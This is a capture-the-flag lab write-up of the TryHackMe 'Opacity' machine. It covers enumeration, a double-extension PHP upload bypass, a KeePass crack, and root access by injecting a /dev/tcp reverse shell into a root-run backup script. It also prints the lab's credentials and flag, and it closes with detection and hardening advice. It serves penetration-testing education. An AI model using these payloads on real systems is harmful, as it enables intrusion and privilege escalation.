# TryHackMe - Opacity Writeup

## Machine Information

| Category | Details |
|----------|----------|
| Platform | TryHackMe |
| Machine | Opacity |
| Difficulty | Easy |
| Operating System | Linux |
| Skills Learned | Enumeration, File Upload Bypass, Reverse Shell, Credential Extraction, KeePass Password Cracking, Privilege Escalation |

---

# Introduction

Today we are back with another **TryHackMe** easy-rated Linux machine called **Opacity**.

This machine demonstrates how multiple low-to-medium severity weaknesses can be chained together to completely compromise a Linux server.

Rather than relying on a single critical vulnerability, the attack combines:

- Web Enumeration
- File Upload Bypass
- Remote Code Execution
- Local Enumeration
- Password Database Cracking
- Credential Reuse
- Scheduled Task Abuse
- Privilege Escalation

The room is an excellent introduction to post-exploitation techniques and emphasizes the importance of proper file validation, credential protection, and secure automation.

---

# Scenario

Our objective is to perform a complete penetration test against the target machine.

Starting with reconnaissance, we enumerate available services, identify potential attack vectors, gain an initial foothold through the vulnerable web application, recover privileged credentials, and finally escalate privileges to obtain full administrative access.

---

# Objectives

Throughout this machine we will:

- Perform network reconnaissance.
- Enumerate exposed services.
- Identify hidden web directories.
- Exploit an insecure file upload feature.
- Gain remote code execution.
- Stabilize the reverse shell.
- Perform local enumeration.
- Recover sensitive credential files.
- Crack a KeePass password database.
- Login through SSH.
- Prepare for privilege escalation.

---

# Attack Path

```
Reconnaissance
        │
        ▼
Service Enumeration
        │
        ▼
Directory Enumeration
        │
        ▼
Image Upload Function
        │
        ▼
PHP Upload Bypass
        │
        ▼
Reverse Shell (www-data)
        │
        ▼
Local Enumeration
        │
        ▼
KeePass Database Discovery
        │
        ▼
Password Cracking
        │
        ▼
SSH Login (sysadmin)
        │
        ▼
Privilege Escalation
```

---

# Reconnaissance

As always, we begin by performing a full TCP port scan against the target machine.

```bash
nmap -p- <TARGET-IP>
```

### Results

```
22/tcp   Open   SSH
80/tcp   Open   HTTP
139/tcp  Open   NetBIOS
445/tcp  Open   SMB
```

The scan identifies four accessible services.

- SSH
- Apache Web Server
- NetBIOS
- Samba

These services become our primary attack surface.

---

# Service Enumeration

Next, we perform service and version detection.

```bash
nmap -sC -sV <TARGET-IP>
```

### Important Findings

| Port | Service | Version |
|-------|----------|---------|
|22|OpenSSH|8.2p1 Ubuntu|
|80|Apache|2.4.41 Ubuntu|
|139|NetBIOS|Samba|
|445|SMB|Samba 4|

Interesting observations include:

- Apache redirects directly to `login.php`.
- SMB signing is enabled but not enforced.
- The PHP session cookie lacks the **HttpOnly** flag.
- Samba is available for enumeration.

At this point, both SMB and HTTP deserve further investigation.

---

# SMB Enumeration

We first inspect the SMB service using **Enum4linux**.

```bash
enum4linux <TARGET-IP>
```

The scan identifies two local users.

```
sysadmin

ubuntu
```

Although usernames are disclosed, no useful SMB shares or anonymous access are available.

Additional enumeration using **SMBClient** also fails to reveal sensitive information.

Since SMB does not provide an immediate attack path, attention shifts toward the web application.

---

# Web Enumeration

Opening the web server immediately presents a login portal.

Rather than attempting brute force attacks, it is generally more effective to enumerate hidden content first.

---

# Directory Enumeration

Gobuster is used to discover hidden directories.

```bash
gobuster dir \
-u http://TARGET-IP \
-w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt
```

### Results

```
/css

/cloud

/server-status (403)
```

The `/cloud` directory immediately stands out because it is not linked from the main application.

This becomes the primary focus of the assessment.

---

# Investigating the Cloud Application

Visiting the `/cloud` directory reveals an image upload feature.

The application allows users to upload PNG images.

Whenever upload functionality exists, several attack vectors should be considered:

- Arbitrary File Upload
- Extension Bypass
- MIME Type Bypass
- Double Extension
- Null Byte Injection
- Content-Type Manipulation

Testing confirms that the application only performs weak validation based on file extensions.

---

# Exploiting the File Upload

Instead of uploading a normal image, we prepare a PHP reverse shell.

The upload restriction is bypassed using a double-extension technique.

Example filename:

```
shell.php#.png
```

The application incorrectly accepts the file while still storing it with executable PHP content.

After upload, the application reveals the file location.

```
/cloud/images/shell.php
```

Because Apache executes PHP files, visiting the uploaded shell results in remote code execution.

---

# Initial Foothold

A Netcat listener is started.

```bash
nc -lvnp 4444
```

After accessing the uploaded PHP file through the browser, the reverse shell successfully connects back.

```
uid=33(www-data)
```

Initial access is obtained as the **www-data** web server account.

---

# Shell Stabilization

Interactive shells are far easier to work with during post-exploitation.

Python is used to spawn a proper pseudo-terminal.

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

The local terminal is then adjusted.

```bash
stty raw -echo
fg

export TERM=xterm-256color
```

The shell now behaves like a standard Linux terminal, allowing interactive commands, editors, and tab completion.

---

# Local Enumeration

With code execution established, we begin searching for sensitive files.

Standard enumeration reveals very little useful information.

Further searching identifies an interesting directory.

```
/home/sysadmin/scripts/lib
```

Additional enumeration eventually discovers several noteworthy files.

```
/opt/dataset.kdbx

/home/sysadmin/local.txt

/home/sysadmin/.bash_history
```

Among these, the **KeePass database** is by far the most valuable discovery.

---

# KeePass Database Discovery

The file located at

```
/opt/dataset.kdbx
```

is copied back to the attacking machine for offline analysis.

KeePass databases frequently store administrative credentials, making them attractive targets during penetration tests.

---

# Cracking the KeePass Database

The KeePass hash is first extracted.

```bash
keepass2john dataset.kdbx > hash
```

The resulting hash is cracked using **John the Ripper**.

```bash
john hash
```

John successfully recovers the master password.

```
741852963
```

Using the recovered password, the database is opened with **KeePassXC**.

Inside the database we discover valid SSH credentials.

```
Username:
sysadmin

Password:
Cl0udP4ss40p4city#8700
```

Recovering these credentials provides a far more stable foothold than the web shell.

---

# SSH Access

Using the recovered credentials, authentication succeeds over SSH.

```bash
ssh sysadmin@TARGET-IP
```

We now obtain an interactive shell as the **sysadmin** user.

From this point onward, the focus shifts from initial compromise to privilege escalation.

---

# Part 1 Summary

In the first phase of the assessment, we successfully enumerated the exposed services, identified a vulnerable image upload feature within the web application, bypassed file validation to upload a PHP reverse shell, and gained initial access as **www-data**. Through local enumeration, we discovered a KeePass password database containing privileged credentials, cracked its master password using **John the Ripper**, and authenticated to the system as the **sysadmin** user via SSH. With a stable user shell established, the next stage will focus on identifying privilege escalation vectors to obtain full root access.

# Privilege Escalation Enumeration

With a stable SSH session established as **sysadmin**, the next objective is to identify a privilege escalation path to gain root access.

The first step is to check for any commands that can be executed with elevated privileges.

```bash
sudo -l
```

### Output

```text
Sorry, user sysadmin may not run sudo on ip-10-49-175-212.
```

Unfortunately, the user is **not** allowed to execute any commands through sudo.

Since common privilege escalation techniques are unavailable, we continue with manual enumeration.

---

# Looking for Privilege Escalation Vectors

Without sudo access, we begin searching for:

- Scheduled tasks
- Cron jobs
- Writable scripts
- SUID binaries
- Running services
- Misconfigured permissions

Standard enumeration tools provide limited information.

To monitor background processes in real time, we upload **pspy64**.

---

# Monitoring Background Processes

`pspy64` is an excellent post-exploitation tool that allows unprivileged users to observe processes executed by other users, including root.

After running pspy, a recurring process is observed.

The process repeatedly executes a backup script located inside the **sysadmin** home directory.

This immediately becomes a potential privilege escalation vector because automated scripts executed by root often introduce security risks.

---

# Investigating the Backup Script

The monitored process references a PHP include file:

```text
backup.inc.php
```

This file resides inside:

```text
/home/sysadmin/scripts/lib/
```

Because the file is writable by the current user, it becomes possible to modify the code that will later be executed by the automated backup process.

This is a classic example of **insecure scheduled task execution**.

---

# Preparing the Payload

The existing backup file is removed.

```bash
rm backup.inc.php
```

A new file with the same name is created.

Inside the file, a simple PHP payload is inserted.

```php
<?php

ini_set('max_execution_time',600);
ini_set('memory_limit','1024M');

function zipData($source,$destination){
    system("bash -c 'bash -i >& /dev/tcp/ATTACKER-IP/5555 0>&1'");
}

?>
```

Instead of performing the intended backup operation, the modified function now launches a reverse shell back to the attacker's machine.

---

# Waiting for the Scheduled Task

A Netcat listener is prepared.

```bash
nc -lvnp 5555
```

Since the backup process executes automatically, no further interaction is required.

After a short period, the scheduled task runs as expected.

The listener immediately receives a new connection.

```text
connect to ATTACKER-IP
```

Checking the current user confirms successful privilege escalation.

```bash
whoami
```

Output

```text
root
```

The scheduled backup process executed our modified PHP code with **root privileges**, granting complete control over the system.

---

# Capturing the Root Flag

After obtaining the root shell, we navigate to the root user's home directory.

```bash
cd /root
```

Listing the contents reveals the final proof file.

```bash
ls
```

```
proof.txt
```

Reading the file successfully completes the room.

```bash
cat proof.txt
```

```
ac0d56f93202dd57dcb2498c739fd20e
```

Root access has now been achieved.

---

# Complete Attack Chain

```
Reconnaissance
        │
        ▼
Nmap Enumeration
        │
        ▼
SMB Enumeration
        │
        ▼
Gobuster Directory Discovery
        │
        ▼
Image Upload Feature
        │
        ▼
File Upload Validation Bypass
        │
        ▼
PHP Reverse Shell
        │
        ▼
www-data Access
        │
        ▼
Local Enumeration
        │
        ▼
KeePass Database Discovery
        │
        ▼
Password Cracking
        │
        ▼
SSH Access (sysadmin)
        │
        ▼
pspy Process Monitoring
        │
        ▼
Writable Root Backup Script
        │
        ▼
Reverse Shell Injection
        │
        ▼
Root Shell
        │
        ▼
Proof Flag
```

---

# Vulnerability Analysis

## 1. Weak File Upload Validation

The web application validated uploads using only the filename extension.

This allowed a PHP script to bypass the upload restrictions through a double-extension technique, resulting in Remote Code Execution.

---

## 2. Sensitive Credential Storage

A KeePass database containing administrative credentials was accessible after initial compromise.

Sensitive credential stores should never be readable from low-privileged application contexts.

---

## 3. Password Reuse

Once the KeePass database was cracked, the recovered credentials granted direct SSH access.

Strong password policies and additional authentication mechanisms could reduce this risk.

---

## 4. Insecure Scheduled Task

The most critical vulnerability was the root-owned backup process executing code from a user-writable file.

Any privileged scheduled task should ensure that scripts and configuration files cannot be modified by unprivileged users.

---

# MITRE ATT&CK Mapping

| Phase | Technique |
|--------|-----------|
| Initial Access | T1190 – Exploit Public-Facing Application |
| Execution | T1059.006 – Command and Scripting Interpreter: PHP |
| Persistence | Existing Valid Accounts |
| Credential Access | T1555 – Credentials from Password Stores |
| Discovery | T1083 – File and Directory Discovery |
| Credential Cracking | T1110.002 – Password Cracking |
| Lateral Movement | T1078 – Valid Accounts |
| Privilege Escalation | T1053 – Scheduled Task / Job |
| Impact | Full System Compromise |

---

# Detection Opportunities

Security teams could detect this attack by monitoring:

- File uploads containing executable content.
- Unexpected PHP files within upload directories.
- Outbound reverse shell connections initiated by the web server.
- Access to sensitive `.kdbx` password database files.
- Execution of password-cracking utilities on recovered credential stores.
- Modification of backup scripts or scheduled task files.
- Root processes executing files from user-controlled directories.
- Unexpected network connections initiated by scheduled maintenance jobs.

---

# Security Recommendations

To prevent attacks similar to Opacity, organizations should:

- Validate uploaded files using MIME types and file signatures instead of relying only on extensions.
- Store uploaded files outside the web root and disable script execution within upload directories.
- Restrict access to password databases and other sensitive files using proper file permissions.
- Enforce strong credential management and avoid storing privileged credentials on production systems.
- Protect scheduled tasks by ensuring that root-owned scripts are not writable by non-privileged users.
- Continuously monitor file integrity for scripts executed with elevated privileges.
- Deploy Endpoint Detection and Response (EDR) solutions to detect suspicious command execution and reverse shell activity.

---

# Lessons Learned

The **Opacity** machine demonstrates how several individually moderate weaknesses can be chained together into a complete system compromise.

A vulnerable file upload feature provided initial access, poor credential management exposed administrative credentials, and an insecure automated backup process ultimately allowed privilege escalation to root.

This challenge reinforces the importance of secure file handling, proper protection of credential stores, least-privilege access controls, and careful auditing of automated tasks running with elevated permissions.

---

# Conclusion - Jai Shri Ram

**Opacity** is an excellent beginner-friendly Linux machine that showcases a realistic multi-stage attack chain. Rather than relying on a single critical vulnerability, the compromise is achieved by combining web exploitation, local enumeration, offline password cracking, credential reuse, and privilege escalation through an insecure scheduled task.

The room provides valuable hands-on experience with file upload exploitation, reverse shells, KeePass credential recovery, process monitoring using **pspy**, and privilege escalation techniques commonly encountered during penetration testing and Capture The Flag (CTF) engagements.
